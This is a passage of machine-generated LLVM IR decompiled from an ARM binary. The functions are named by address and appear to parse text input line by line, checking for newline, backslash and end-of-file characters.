  %v5_13a0c = call i32 @function_155cc(i32 %v2_13a00, i32* %v4_13a0c, i32 %v3_13a08, i32 %v6_139f4)
  %tmp9 = icmp slt i32 %v5_13a0c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13a1c

.thread:                                          ; preds = %dec_label_pc_13a00
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13a54

dec_label_pc_13a1c:                               ; preds = %dec_label_pc_13a00
  %v1_13a1c = load i32, i32* @r5, align 4
  %v2_13a1c = add i32 %v1_13a1c, 8
  %v3_13a1c = inttoptr i32 %v2_13a1c to i32*
  store i32 %v5_13a0c, i32* %v3_13a1c, align 4
  %v0_13a20 = load i32, i32* @r7, align 4
  %v1_13a20 = load i32, i32* @r5, align 4
  %v2_13a20 = add i32 %v1_13a20, 4
  %v3_13a20 = inttoptr i32 %v2_13a20 to i32*
  store i32 %v0_13a20, i32* %v3_13a20, align 4
  %v0_13a24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a24:                               ; preds = %dec_label_pc_139f4, %dec_label_pc_13a1c
  %v1_13a48 = phi i32 [ %v0_139f4, %dec_label_pc_139f4 ], [ %v0_13a24.pre, %dec_label_pc_13a1c ]
  %v1_13a24 = add i32 %v1_13a48, 4
  %v2_13a24 = inttoptr i32 %v1_13a24 to i32*
  %v3_13a24 = load i32, i32* %v2_13a24, align 4
  %v1_13a28 = add i32 %v1_13a48, 12
  %v2_13a28 = inttoptr i32 %v1_13a28 to i32*
  %v3_13a28 = load i32, i32* %v2_13a28, align 4
  %v2_13a2c = add i32 %v3_13a28, %v3_13a24
  store i32 %v2_13a2c, i32* @r4, align 4
  %v3_13a30 = inttoptr i32 %v2_13a2c to i32*
  %v4_13a30 = load i32, i32* %v3_13a30, align 4
  %v1_13a34 = add i32 %v2_13a2c, 4
  %v2_13a34 = inttoptr i32 %v1_13a34 to i32*
  %v3_13a34 = load i32, i32* %v2_13a34, align 4
  %v1_13a38 = add i32 %v2_13a2c, 16
  %v2_13a38 = inttoptr i32 %v1_13a38 to i16*
  %v3_13a38 = load i16, i16* %v2_13a38, align 2
  %v4_13a38 = zext i16 %v3_13a38 to i32
  %v1_13a3c = add i32 %v2_13a2c, 8
  %v2_13a3c = inttoptr i32 %v1_13a3c to i32*
  %v3_13a3c = load i32, i32* %v2_13a3c, align 4
  store i32 %v3_13a3c, i32* %ip.global-to-local, align 4
  %v2_13a40 = add i32 %v4_13a38, %v3_13a24
  %v2_13a44 = or i32 %v3_13a34, %v4_13a30
  %v4_13a44 = icmp eq i32 %v2_13a44, 0
  store i32 %v2_13a40, i32* %v2_13a24, align 4
  %v0_13a4c = load i32, i32* %ip.global-to-local, align 4
  %v1_13a4c = load i32, i32* @r5, align 4
  %v2_13a4c = add i32 %v1_13a4c, 16
  %v3_13a4c = inttoptr i32 %v2_13a4c to i32*
  store i32 %v0_13a4c, i32* %v3_13a4c, align 4
  br i1 %v4_13a44, label %dec_label_pc_139f4, label %dec_label_pc_13a54

dec_label_pc_13a54:                               ; preds = %dec_label_pc_13a24, %.thread
  %v0_13a60 = load i32, i32* @r6, align 4
  %v2_13a60 = add i32 %v0_13a60, 24
  %v3_13a60 = inttoptr i32 %v2_13a60 to i32*
  %v4_13a60 = load i32, i32* %v3_13a60, align 4
  store i32 %v4_13a60, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13a60)
  %v0_13a6c = load i32, i32* @r4, align 4
  ret i32 %v0_13a6c

; uselistorder directives
  uselistorder i32 %v2_13a2c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_13a48, { 1, 0 }
  uselistorder i32 %v6_139f4, { 1, 0 }
  uselistorder i32 %v0_139f4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_13a24, { 1, 0 }
}

define i32 @function_13a80(i32 %arg1) local_unnamed_addr {
dec_label_pc_13a80:
  %v0_13a80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a80, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13a80
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13a80, %bb
  %v10_13a8c = phi i32 [ %arg1, %dec_label_pc_13a80 ], [ 0, %bb ]
  ret i32 %v10_13a8c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_13a90(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13a90:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_13a90 = load i32, i32* @r4, align 4
  %v6_13a90 = load i32, i32* @r5, align 4
  %v9_13a90 = load i32, i32* @r6, align 4
  %v12_13a90 = load i32, i32* @r7, align 4
  %v15_13a90 = load i32, i32* @r8, align 4
  %v18_13a90 = load i32, i32* @sb, align 4
  %v21_13a90 = load i32, i32* @sl, align 4
  %v24_13a90 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13a94 = icmp eq i32* %arg1, null
  store i1 %v2_13a94, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_13a94, label %dec_label_pc_13da4, label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a90
  %v1_13aac = urem i32 %arg3, 256
  store i32 %v1_13aac, i32* @sb, align 4
  %v1_13ab0 = udiv i32 %arg3, 256
  %v3_13ab4 = urem i32 %v1_13ab0, 256
  %v3_13ab8 = mul nuw nsw i32 %v1_13aac, 4
  %v1_13ac0 = or i32 %v3_13ab8, 1
  %v1_13acc = and i32 %arg3, 131072
  %v1_13ad0 = add nsw i32 %v1_13aac, -1
  %v1_13adc = and i32 %arg3, 262144
  store i32 %v1_13adc, i32* %r2.global-to-local, align 4
  %v1_13ae0 = and i32 %arg3, 65536
  store i32 %v1_13ae0, i32* %r3.global-to-local, align 4
  store i32 %v1_13ae0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_13af0 = add i32 %arg4, 1
  store i32 %v1_13af0, i32* @sl, align 4
  %v2_13c70 = inttoptr i32 %arg2 to i32*
  %v2_13c80 = icmp eq i32 %v1_13acc, 0
  %v2_13cd8 = icmp eq i32 %v1_13adc, 0
  br label %dec_label_pc_13af4

dec_label_pc_13af4:                               ; preds = %dec_label_pc_13af4.backedge, %dec_label_pc_13aac
  %v2_13b10 = phi i32 [ %v0_13af4.pre, %dec_label_pc_13af4.backedge ], [ %tmp, %dec_label_pc_13aac ]
  %v1_13af4 = add i32 %v2_13b10, 4
  %v2_13af4 = inttoptr i32 %v1_13af4 to i32*
  %v3_13af4 = load i32, i32* %v2_13af4, align 4
  store i32 %v3_13af4, i32* %r3.global-to-local, align 4
  %v2_13af8 = icmp eq i32 %v3_13af4, 0
  store i1 %v2_13af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13af8, label %dec_label_pc_13b00, label %dec_label_pc_13b48

dec_label_pc_13b00:                               ; preds = %dec_label_pc_13af4
  %v1_13b00 = add i32 %v2_13b10, 16
  %v2_13b00 = inttoptr i32 %v1_13b00 to i32*
  %v3_13b00 = load i32, i32* %v2_13b00, align 4
  store i32 %v3_13b00, i32* %r3.global-to-local, align 4
  %v2_13b04 = icmp eq i32 %v3_13b00, 0
  store i1 %v2_13b04, i1* %cpsr_z.global-to-local, align 1
  %v1_13b08 = add i32 %v2_13b10, 8
  %v2_13b08 = inttoptr i32 %v1_13b08 to i32*
  %v3_13b08 = load i32, i32* %v2_13b08, align 4
  store i32 %v3_13b08, i32* %r3.global-to-local, align 4
  br i1 %v2_13b04, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_13b00
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_13b00, align 4
  %v0_13b14.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13b00, %bb
  %v0_13b14 = phi i32 [ %v0_13b14.pre, %bb ], [ %v3_13b08, %dec_label_pc_13b00 ]
  %v2_13b14 = icmp eq i32 %v0_13b14, 0
  store i1 %v2_13b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b14, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_13ac0, i32* %r3.global-to-local, align 4
  %v2_13b1c = load i32, i32* @r5, align 4
  %v3_13b1c = add i32 %v2_13b1c, 8
  %v4_13b1c = inttoptr i32 %v3_13b1c to i32*
  store i32 %v1_13ac0, i32* %v4_13b1c, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_13b20 = load i32, i32* @r5, align 4
  %v1_13b20 = add i32 %v0_13b20, 16
  %v2_13b20 = inttoptr i32 %v1_13b20 to i32*
  %v3_13b20 = load i32, i32* %v2_13b20, align 4
  store i32 %v3_13b20, i32* %r0.global-to-local, align 4
  %v1_13b24 = add i32 %v0_13b20, 8
  %v2_13b24 = inttoptr i32 %v1_13b24 to i32*
  %v3_13b24 = load i32, i32* %v2_13b24, align 4
  store i32 %v3_13b24, i32* %r3.global-to-local, align 4
  %v2_13b28 = add i32 %v3_13b24, %v3_13b20
  store i32 %v2_13b28, i32* @r0, align 4
  %v0_13b2c = call i32 @function_11038()
  store i32 %v0_13b2c, i32* %r0.global-to-local, align 4
  %v2_13b30 = icmp eq i32 %v0_13b2c, 0
  store i1 %v2_13b30, i1* %cpsr_z.global-to-local, align 1
  %v1_13b34 = load i32, i32* @r5, align 4
  %v2_13b34 = add i32 %v1_13b34, 4
  %v3_13b34 = inttoptr i32 %v2_13b34 to i32*
  store i32 %v0_13b2c, i32* %v3_13b34, align 4
  br i1 %v2_13b30, label %dec_label_pc_13da4, label %dec_label_pc_13b3c

dec_label_pc_13b3c:                               ; preds = %.thread
  %v0_13b3c = load i32, i32* @r5, align 4
  %v1_13b3c = add i32 %v0_13b3c, 20
  %v2_13b3c = inttoptr i32 %v1_13b3c to i32*
  %v3_13b3c = load i32, i32* %v2_13b3c, align 4
  %v1_13b40 = or i32 %v3_13b3c, 1
  store i32 %v1_13b40, i32* %r3.global-to-local, align 4
  store i32 %v1_13b40, i32* %v2_13b3c, align 4
  %v0_13b48.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13af4, %dec_label_pc_13b3c
  %v1_13b50 = phi i32 [ %v2_13b10, %dec_label_pc_13af4 ], [ %v0_13b48.pre, %dec_label_pc_13b3c ]
  %v1_13b48 = add i32 %v1_13b50, 4
  %v2_13b48 = inttoptr i32 %v1_13b48 to i32*
  %v3_13b48 = load i32, i32* %v2_13b48, align 4
  store i32 %v3_13b48, i32* %r2.global-to-local, align 4
  %v4_13b48 = add i32 %v1_13b50, 8
  %v5_13b48 = inttoptr i32 %v4_13b48 to i32*
  %v6_13b48 = load i32, i32* %v5_13b48, align 4
  %v2_13b4c = add i32 %v6_13b48, %v3_13b48
  store i32 %v2_13b4c, i32* %r3.global-to-local, align 4
  %v2_13b50 = add i32 %v1_13b50, 12
  %v3_13b50 = inttoptr i32 %v2_13b50 to i32*
  store i32 %v2_13b4c, i32* %v3_13b50, align 4
  %v0_13b54 = load i32, i32* @fp, align 4
  store i32 %v0_13b54, i32* @r6, align 4
  br label %dec_label_pc_13b58

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13be4, %dec_label_pc_13bd0, %dec_label_pc_13b48
  %v0_13b60 = phi i32 [ %v0_13b54, %dec_label_pc_13b48 ], [ %v1_13bd0, %dec_label_pc_13bd0 ], [ %v0_13b60.pre.pre, %dec_label_pc_13be4 ]
  %v0_13b58 = load i32, i32* @r5, align 4
  %v1_13b58 = add i32 %v0_13b58, 12
  store i32 %v1_13b58, i32* %r0.global-to-local, align 4
  %v1_13b5c = inttoptr i32 %v1_13b58 to i32*
  %v2_13b5c = load i32, i32* %v1_13b5c, align 4
  store i32 %v2_13b5c, i32* %r0.global-to-local, align 4
  %v3_13b5c = add i32 %v0_13b58, 16
  %v4_13b5c = inttoptr i32 %v3_13b5c to i32*
  %v5_13b5c = load i32, i32* %v4_13b5c, align 4
  %v2_13b60 = add i32 %v2_13b5c, %v0_13b60
  store i32 %v2_13b60, i32* %r0.global-to-local, align 4
  %v2_13b64 = sub i32 %v5_13b5c, %v0_13b60
  %v1_13b68 = inttoptr i32 %v0_13b58 to i32*
  %v2_13b68 = load i32, i32* %v1_13b68, align 4
  store i32 %v2_13b68, i32* %r2.global-to-local, align 4
  %v3_13b6c = call i32 @function_1458c(i32 %v2_13b60, i32 %v2_13b64, i32 %v2_13b68)
  store i32 %v3_13b6c, i32* %r0.global-to-local, align 4
  store i32 %v3_13b6c, i32* %r4.global-to-local, align 4
  %v2_13b70 = icmp eq i32 %v3_13b6c, 0
  store i1 %v2_13b70, i1* %cpsr_z.global-to-local, align 1
  %v0_13b78 = load i32, i32* @r5, align 4
  %v1_13b78 = add i32 %v0_13b78, 12
  br i1 %v2_13b70, label %dec_label_pc_13b78, label %dec_label_pc_13b90

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b58
  store i32 %v1_13b78, i32* %r0.global-to-local, align 4
  %v1_13b7c = inttoptr i32 %v1_13b78 to i32*
  %v2_13b7c = load i32, i32* %v1_13b7c, align 4
  store i32 %v2_13b7c, i32* %r0.global-to-local, align 4
  %v3_13b7c = add i32 %v0_13b78, 16
  %v4_13b7c = inttoptr i32 %v3_13b7c to i32*
  %v5_13b7c = load i32, i32* %v4_13b7c, align 4
  store i32 %v5_13b7c, i32* @r2, align 4
  %v2_13b84 = inttoptr i32 %v2_13b7c to i8*
  %v3_13b84 = call i32 @function_10a80(i8* %v2_13b84, i32 0)
  store i32 %v3_13b84, i32* %r0.global-to-local, align 4
  %v0_13b88 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13da8

dec_label_pc_13b90:                               ; preds = %dec_label_pc_13b58
  %v2_13b90 = inttoptr i32 %v1_13b78 to i32*
  %v3_13b90 = load i32, i32* %v2_13b90, align 4
  store i32 %v3_13b90, i32* @r4, align 4
  %v1_13b94 = load i32, i32* @r6, align 4
  %v2_13b94 = add i32 %v1_13b94, %v3_13b90
  store i32 %v2_13b94, i32* %r0.global-to-local, align 4
  %v1_13b98 = call i32 @function_15040(i32 %v2_13b94)
  %v0_13ba0 = load i32, i32* @r6, align 4
  %v2_13ba0 = add i32 %v0_13ba0, %v1_13b98
  store i32 %v2_13ba0, i32* @r6, align 4
  %v0_13ba4 = load i32, i32* @r4, align 4
  store i32 %v0_13ba4, i32* @r0, align 4
  %v2_13ba8 = call i32 @function_1528c(i32 %v0_13ba4, i32 10)
  store i32 %v2_13ba8, i32* %r0.global-to-local, align 4
  %v2_13bac = icmp eq i32 %v2_13ba8, 0
  store i1 %v2_13bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13bac, label %dec_label_pc_13bd8, label %dec_label_pc_13bb4

dec_label_pc_13bb4:                               ; preds = %dec_label_pc_13b90
  %v1_13bb4 = inttoptr i32 %v2_13ba8 to i8*
  %v2_13bb4 = load i8, i8* %v1_13bb4, align 1
  %v3_13bb4 = zext i8 %v2_13bb4 to i32
  %v1_13bb8 = add nuw nsw i32 %v3_13bb4, 255
  %v1_13bbc = urem i32 %v1_13bb8, 256
  store i32 %v1_13bbc, i32* %r3.global-to-local, align 4
  %v7_13bc0 = icmp eq i32 %v1_13bbc, 92
  store i1 %v7_13bc0, i1* %cpsr_z.global-to-local, align 1
  %v1_13bc4 = trunc i32 %v1_13bb8 to i8
  store i8 %v1_13bc4, i8* %v1_13bb4, align 1
  %v0_13bc8 = load i32, i32* @r6, align 4
  %v1_13bc8 = add i32 %v0_13bc8, -1
  store i32 %v1_13bc8, i32* @r6, align 4
  %v0_13bcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13bcc, label %dec_label_pc_13bd0, label %dec_label_pc_13c5c

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13bb4
  %v1_13bd0 = add i32 %v0_13bc8, -2
  store i32 %v1_13bd0, i32* @r6, align 4
  br label %dec_label_pc_13b58

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13b90
  %v0_13bd8 = load i32, i32* @r5, align 4
  %v1_13bd8 = add i32 %v0_13bd8, 20
  %v2_13bd8 = inttoptr i32 %v1_13bd8 to i32*
  %v3_13bd8 = load i32, i32* %v2_13bd8, align 4
  store i32 %v3_13bd8, i32* %r3.global-to-local, align 4
  %v2_13bdc = icmp eq i32 %v3_13bd8, 0
  store i1 %v2_13bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13bdc, label %dec_label_pc_13c14, label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bd8
  %v1_13be4 = add i32 %v0_13bd8, 16
  %v2_13be4 = inttoptr i32 %v1_13be4 to i32*
  %v3_13be4 = load i32, i32* %v2_13be4, align 4
  store i32 %v3_13be4, i32* %r3.global-to-local, align 4
  %v1_13be8 = add i32 %v0_13bd8, 8
  %v2_13be8 = inttoptr i32 %v1_13be8 to i32*
  %v3_13be8 = load i32, i32* %v2_13be8, align 4
  %v1_13bec = add i32 %v3_13be4, 4096
  store i32 %v1_13bec, i32* %r3.global-to-local, align 4
  %v2_13bf0 = add i32 %v3_13be8, %v1_13bec
  store i32 %v1_13bec, i32* %v2_13be4, align 4
  %v0_13bf8 = load i32, i32* @r5, align 4
  %v1_13bf8 = add i32 %v0_13bf8, 4
  %v2_13bf8 = inttoptr i32 %v1_13bf8 to i32*
  %v3_13bf8 = load i32, i32* %v2_13bf8, align 4
  store i32 %v3_13bf8, i32* %r0.global-to-local, align 4
  %v2_13bfc = inttoptr i32 %v3_13bf8 to i32*
  %v3_13bfc = call i32 @function_11a8c(i32* %v2_13bfc, i32 %v2_13bf0)
  store i32 %v3_13bfc, i32* %r0.global-to-local, align 4
  %v0_13c00 = load i32, i32* @r5, align 4
  %v1_13c00 = add i32 %v0_13c00, 8
  %v2_13c00 = inttoptr i32 %v1_13c00 to i32*
  %v3_13c00 = load i32, i32* %v2_13c00, align 4
  %v2_13c04 = add i32 %v3_13c00, %v3_13bfc
  store i32 %v2_13c04, i32* %r3.global-to-local, align 4
  %v2_13c08 = add i32 %v0_13c00, 12
  %v3_13c08 = inttoptr i32 %v2_13c08 to i32*
  store i32 %v2_13c04, i32* %v3_13c08, align 4
  %v1_13c0c = load i32, i32* @r5, align 4
  %v2_13c0c = add i32 %v1_13c0c, 4
  %v3_13c0c = inttoptr i32 %v2_13c0c to i32*
  store i32 %v3_13bfc, i32* %v3_13c0c, align 4
  %v0_13b60.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13b58

dec_label_pc_13c14:                               ; preds = %dec_label_pc_13bd8, %.dec_label_pc_13c14_crit_edge
  %v0_13c14 = phi i32 [ %v0_13c14.pre, %.dec_label_pc_13c14_crit_edge ], [ %v0_13bd8, %dec_label_pc_13bd8 ]
  %v1_13c14 = inttoptr i32 %v0_13c14 to i32*
  %v2_13c14 = load i32, i32* %v1_13c14, align 4
  %v1_13c18 = add i32 %v2_13c14, 52
  %v2_13c18 = inttoptr i32 %v1_13c18 to i32*
  %v3_13c18 = load i32, i32* %v2_13c18, align 4
  store i32 %v3_13c18, i32* %r3.global-to-local, align 4
  %v2_13c1c = icmp eq i32 %v3_13c18, 0
  store i1 %v2_13c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c1c, label %dec_label_pc_13c48, label %dec_label_pc_13c24

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c14
  %v1_13c24 = add i32 %v2_13c14, 16
  %v2_13c24 = inttoptr i32 %v1_13c24 to i32*
  %v3_13c24 = load i32, i32* %v2_13c24, align 4
  store i32 %v3_13c24, i32* %r2.global-to-local, align 4
  %v1_13c28 = add i32 %v2_13c14, 24
  %v2_13c28 = inttoptr i32 %v1_13c28 to i32*
  %v3_13c28 = load i32, i32* %v2_13c28, align 4
  store i32 %v3_13c28, i32* %r3.global-to-local, align 4
  %v3_13c2c = icmp ult i32 %v3_13c24, %v3_13c28
  %v9_13c2c = icmp eq i32 %v3_13c24, %v3_13c28
  store i1 %v9_13c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13c2c, label %dec_label_pc_13c50thread-pre-split, label %dec_label_pc_13c3c

dec_label_pc_13c3c:                               ; preds = %dec_label_pc_13c24
  store i32 %v2_13c14, i32* %r0.global-to-local, align 4
  %v1_13c40 = inttoptr i32 %v2_13c14 to i16*
  %v2_13c40 = call i32 @function_149dc(i16* %v1_13c40)
  store i32 %v2_13c40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c50

dec_label_pc_13c48:                               ; preds = %dec_label_pc_13c14
  store i32 %v2_13c14, i32* %r0.global-to-local, align 4
  %v1_13c4c = call i32 @function_144b0(i32 %v2_13c14)
  store i32 %v1_13c4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c50

dec_label_pc_13c50thread-pre-split:               ; preds = %dec_label_pc_13c24
  %v2_13c30 = inttoptr i32 %v3_13c24 to i8*
  %v3_13c30 = load i8, i8* %v2_13c30, align 1
  %v4_13c30 = zext i8 %v3_13c30 to i32
  store i32 %v4_13c30, i32* %r0.global-to-local, align 4
  %v6_13c30 = add i32 %v3_13c24, 1
  store i32 %v6_13c30, i32* %r2.global-to-local, align 4
  store i32 %v6_13c30, i32* %v2_13c24, align 4
  %v0_13c50.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c50

dec_label_pc_13c50:                               ; preds = %dec_label_pc_13c50thread-pre-split, %dec_label_pc_13c3c, %dec_label_pc_13c48
  %v1_13c54 = phi i32 [ %v0_13c50.pr, %dec_label_pc_13c50thread-pre-split ], [ %v2_13c40, %dec_label_pc_13c3c ], [ %v1_13c4c, %dec_label_pc_13c48 ]
  %v7_13c50 = icmp eq i32 %v1_13c54, 10
  store i1 %v7_13c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13c50, label %dec_label_pc_13c5c.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_13c50
  %v8_13c54 = icmp eq i32 %v1_13c54, -1
  store i1 %v8_13c54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13c54, label %dec_label_pc_13c5c.loopexit, label %.dec_label_pc_13c14_crit_edge

.dec_label_pc_13c14_crit_edge:                    ; preds = %bb68
  %v0_13c14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13c5c.loopexit:                      ; preds = %bb68, %dec_label_pc_13c50
  %v0_13c5c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13c5c

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13bb4, %dec_label_pc_13c5c.loopexit
  %v0_13c5c = phi i32 [ %v0_13c5c.pre, %dec_label_pc_13c5c.loopexit ], [ %v1_13bc8, %dec_label_pc_13bb4 ]
  %v7_13c5c = icmp eq i32 %v0_13c5c, -1
  store i1 %v7_13c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13c5c, label %dec_label_pc_13da4, label %dec_label_pc_13c64

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c5c
  %v0_13c64 = load i32, i32* @r5, align 4
  %v1_13c64 = add i32 %v0_13c64, 4
  %v2_13c64 = inttoptr i32 %v1_13c64 to i32*
  %v3_13c64 = load i32, i32* %v2_13c64, align 4
  store i32 %v3_13c64, i32* %r0.global-to-local, align 4
  store i32 %v3_13ab8, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_13c64, i32* %v2_13c70, align 4
  %v0_13c74 = load i32, i32* @fp, align 4
  %v2_13c78 = inttoptr i32 %v3_13c64 to i8*
  %v3_13c78 = call i32 @function_10a80(i8* %v2_13c78, i32 %v0_13c74)
  store i32 %v3_13c78, i32* %r0.global-to-local, align 4
  store i32 %v1_13acc, i32* %r2.global-to-local, align 4
  store i1 %v2_13c80, i1* %cpsr_z.global-to-local, align 1
  %v0_13c84 = load i32, i32* @r5, align 4
  %v1_13c84 = add i32 %v0_13c84, 12
  %v2_13c84 = inttoptr i32 %v1_13c84 to i32*
  %v3_13c84 = load i32, i32* %v2_13c84, align 4
  store i32 %v3_13c84, i32* @r4, align 4
  br i1 %v2_13c80, label %dec_label_pc_13c9c, label %dec_label_pc_13c8c

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13c64
  store i32 %v3_13c84, i32* @r0, align 4
  %v0_13c90 = load i32, i32* @sl, align 4
  %v2_13c94 = inttoptr i32 %v3_13c84 to i8*
  %v3_13c94 = call i32 @function_15104(i8* %v2_13c94, i32 %v0_13c90)
  store i32 %v3_13c94, i32* %r0.global-to-local, align 4
  %v0_13c98 = load i32, i32* @r4, align 4
  %v2_13c98 = add i32 %v0_13c98, %v3_13c94
  store i32 %v2_13c98, i32* @r4, align 4
  br label %dec_label_pc_13c9c

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c64, %dec_label_pc_13c8c
  %v0_13d7413 = phi i32 [ %v3_13c84, %dec_label_pc_13c64 ], [ %v2_13c98, %dec_label_pc_13c8c ]
  %v1_13c9c = inttoptr i32 %v0_13d7413 to i8*
  %v2_13c9c = load i8, i8* %v1_13c9c, align 1
  %v3_13c9c = zext i8 %v2_13c9c to i32
  store i32 %v3_13c9c, i32* %r2.global-to-local, align 4
  %v2_13ca0 = icmp eq i8 %v2_13c9c, 0
  store i1 %v2_13ca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ca0, label %dec_label_pc_13af4.backedge, label %dec_label_pc_13ca8

dec_label_pc_13af4.backedge:                      ; preds = %dec_label_pc_13c9c, %dec_label_pc_13d9c, %dec_label_pc_13ca8
  %v0_13af4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13af4

dec_label_pc_13ca8:                               ; preds = %dec_label_pc_13c9c
  %v0_13ca8 = load i32, i32* @r7, align 4
  %v1_13ca8 = inttoptr i32 %v0_13ca8 to i8*
  %v2_13ca8 = load i8, i8* %v1_13ca8, align 1
  %v3_13ca8 = zext i8 %v2_13ca8 to i32
  store i32 %v3_13ca8, i32* %r3.global-to-local, align 4
  %v9_13cac = icmp eq i8 %v2_13ca8, %v2_13c9c
  store i1 %v9_13cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13cac, label %dec_label_pc_13af4.backedge, label %dec_label_pc_13d74.preheader

dec_label_pc_13d74.preheader:                     ; preds = %dec_label_pc_13ca8
  %v1_13cb0 = load i32, i32* @fp, align 4
  store i32 %v1_13cb0, i32* @r6, align 4
  %v2_13d7415 = load i8, i8* %v1_13c9c, align 1
  %v3_13d7416 = zext i8 %v2_13d7415 to i32
  store i32 %v3_13d7416, i32* %r2.global-to-local, align 4
  %v2_13d7817 = icmp eq i8 %v2_13d7415, 0
  store i1 %v2_13d7817, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d7817, label %dec_label_pc_13d90, label %dec_label_pc_13d80.preheader

dec_label_pc_13d80.preheader:                     ; preds = %dec_label_pc_13d74.preheader
  %v2_13d8082 = load i8, i8* %v1_13ca8, align 1
  %v3_13d8083 = zext i8 %v2_13d8082 to i32
  store i32 %v3_13d8083, i32* %r3.global-to-local, align 4
  %v9_13d8486 = icmp eq i8 %v2_13d8082, %v2_13d7415
  store i1 %v9_13d8486, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13d8486, label %dec_label_pc_13d90, label %bb74

dec_label_pc_13cbc:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_13cc0 = load i32, i32* %v2_13c70, align 4
  store i32 %v2_13cc0, i32* %r3.global-to-local, align 4
  store i32 %v1_13ad0, i32* %r2.global-to-local, align 4
  %v9_13cc8 = icmp eq i32 %v2_13ccc88, %v1_13ad0
  store i1 %v9_13cc8, i1* %cpsr_z.global-to-local, align 1
  %v5_13ccc = mul i32 %v2_13ccc88, 4
  %v6_13ccc = add i32 %v2_13cc0, %v5_13ccc
  %v7_13ccc = inttoptr i32 %v6_13ccc to i32*
  store i32 %v0_13ccc87, i32* %v7_13ccc, align 4
  br i1 %v9_13cc8, label %dec_label_pc_13cd4, label %dec_label_pc_13ce0

dec_label_pc_13cd4:                               ; preds = %dec_label_pc_13cbc
  store i32 %v1_13adc, i32* %r3.global-to-local, align 4
  store i1 %v2_13cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cd8, label %dec_label_pc_13ce0, label %dec_label_pc_13d00

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13cd4, %dec_label_pc_13cbc
  %v0_13ce0 = load i32, i32* @r7, align 4
  %v1_13ce0 = inttoptr i32 %v0_13ce0 to i8*
  %v2_13ce0 = load i8, i8* %v1_13ce0, align 1
  %v3_13ce0 = zext i8 %v2_13ce0 to i32
  store i32 %v3_13ce0, i32* %r3.global-to-local, align 4
  %v2_13ce4 = icmp eq i8 %v2_13ce0, 0
  store i1 %v2_13ce4, i1* %cpsr_z.global-to-local, align 1
  %v0_13ce8 = load i32, i32* @r4, align 4
  store i32 %v0_13ce8, i32* @r0, align 4
  %v1_13cec = load i32, i32* @sl, align 4
